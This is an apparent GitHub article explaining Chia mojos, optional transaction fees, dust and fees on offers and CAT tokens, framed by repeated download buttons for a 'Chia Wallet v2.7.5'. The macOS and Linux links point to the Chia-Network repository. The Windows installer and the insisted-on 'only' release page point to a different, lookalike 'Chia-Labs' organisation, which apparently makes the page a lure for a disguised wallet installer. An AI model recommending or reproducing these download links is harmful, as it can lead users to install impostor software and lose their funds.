<div align="center">

![Chia Wallet](../assets/banner-article.png)

</div>

<h1 align="center">What is a mojo and how chia fees work</h1>

<p align="center">CATs, offers and NFTs, explained in order.</p>

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

A mojo is the smallest unit of chia: one XCH equals one trillion mojos, so a mojo is one millionth of a millionth. Fees are optional and separate from the amount you send. A transaction with no fee is valid; a small fee makes it confirm sooner when the network is busy.

## The units, exactly

Chia amounts are whole numbers of mojos internally, and XCH is a display convention. One XCH is 1,000,000,000,000 mojos. That is twelve zeros, which is why software never holds "one and a half XCH" as a fraction: it holds 1,500,000,000,000 mojos and formats it for you.

The unit exists because a blockchain needs integers to avoid rounding drift. When an explorer shows a balance with many decimals, it is showing mojos divided by a trillion, not a separate token.

## Why mojos matter to a wallet user

Two practical consequences follow. First, the smallest amount you can send is one mojo, and anything smaller cannot exist. Second, dust - huge numbers of tiny coins - is a real phenomenon in Chia: a wallet can accumulate thousands of tiny coins, and spending many of them in one transaction makes that transaction larger and more expensive to process.

That is the origin of the "many tiny transactions" experience some users report. [The Chia Wallet send guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/how-to-send-xch-from-chia-wallet.md) covers the practical side, and [pending XCH in Chia Wallet](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/why-a-chia-transaction-is-pending.md) covers why a fee matters when the network is full of them.

## How fees work

A fee is extra value attached to a spend, and it is a priority signal rather than a percentage. You choose it per transaction, and the wallet shows it separately from the amount. Farmers prefer transactions with a fee when blocks are full, so a fee shortens the wait rather than guaranteeing a slot.

Three facts make fees easy to reason about. A fee is not required for validity. The fee goes to the farmer who includes the block, not to the wallet application. And a fee does not change the amount received: send 1 XCH with a 0.0001 XCH fee and the recipient receives 1 XCH.

## What a fee is not

A fee is not a tip, not a subscription and not a percentage of the amount: it is a fixed quantity of XCH attached to one spend and paid to whoever farms the block that includes it. Nor is it a guarantee of speed - it buys preference in a queue, and a very quiet network can confirm a zero-fee transaction before a paid one.

Fees are also not refundable in the ordinary sense. A transaction that confirms carries its fee; one that ages out never charged it. That is why a stuck zero-fee payment costs nothing to reconsider, while a paid one has already spent the fee.

## Choosing a fee

For a routine payment on a quiet network, no fee or a very small one is enough. For anything time-sensitive, or during a period of congestion, a small fee is worth attaching. There is no benefit to overpaying: a high fee does not make a confirmation instant, it only makes it more attractive to include.

The fee to avoid is the accidental one: a transaction fee entered in the wrong field, or a fee on a test transfer that costs more than the test. [The fee screen on a send](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/how-to-send-xch-from-chia-wallet.md) is worth reading once before a large payment.

## Fees on offers and tokens

Offers can carry an optional blockchain fee, paid when the offer is taken, and the offer's terms decide who pays what. CAT transfers behave like XCH transfers and carry the same optional fee. [Creating a chia offer in Chia Wallet](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) covers the fee field, and [the Chia Wallet CAT send](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) covers token transfers.

One detail confuses people: a token transfer that includes a fee can produce an additional fee transaction in the XCH wallet. That is expected bookkeeping, not a double charge.

## Reading amounts without being fooled

Always check the decimal place before confirming, and compare the formatted amount with the summary line that shows the total leaving the wallet rather than only the amount arriving. A field that reads 0.1 when you meant 1 is the most expensive typo in this whole subject, and it is invisible on a phone screen. If the amount is large, write it down before typing it.

Independently, an explorer shows the same amount in both units, which is a useful cross-check after a transfer. [The lookup guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/chia-wallet-lookup.md) covers reading an address from outside the app.

## Fees and the release you run

Fee handling and the display of pending amounts follow the application release, so run the current release from the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5). [Updating Chia Wallet](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/update-chia-wallet-to-current-release.md) is one download and keeps the send screen matching what this article describes.

## Why the fee is not a percentage

A Chia fee buys space in a block, not a share of the amount, so moving a large sum costs the same as moving a small one at the same transaction size. That is the opposite of a card fee, and it is why a fifty-mojo fee can be appropriate for a transfer of any size. The fee is per transaction, so two small sends cost twice the fee of one combined send - a detail that matters when a wallet is tidying up many coins.

## Frequently asked questions

### What is a mojo?

The smallest unit of chia. One XCH is one trillion mojos, and all amounts are stored as whole mojos.

### What are the fees for sending chia?

Optional. You choose a fee per transaction as a priority signal; the recipient always receives the amount you sent.

### Is a fee required?

No. A zero-fee transaction is valid and often confirms quickly; it can wait when the network is congested.

### Why do I see many tiny transactions?

Tiny coins accumulate from small incoming payments. Combining them in a spend makes the transaction larger, which is why a fee helps.

### Does the fee go to the wallet provider?

No. The fee goes to the farmer who includes the block.

---

## Download Chia Wallet

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

## Related guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Offer expired or not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) | The 7-day default, the fee at take time and the trade that lapsed. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Send a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) | Sending a token rather than XCH, and the fee that still applies. |
| [Create a chia offer](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) | Build the trade, set the expiry and publish it without exposing keys. |

</div>
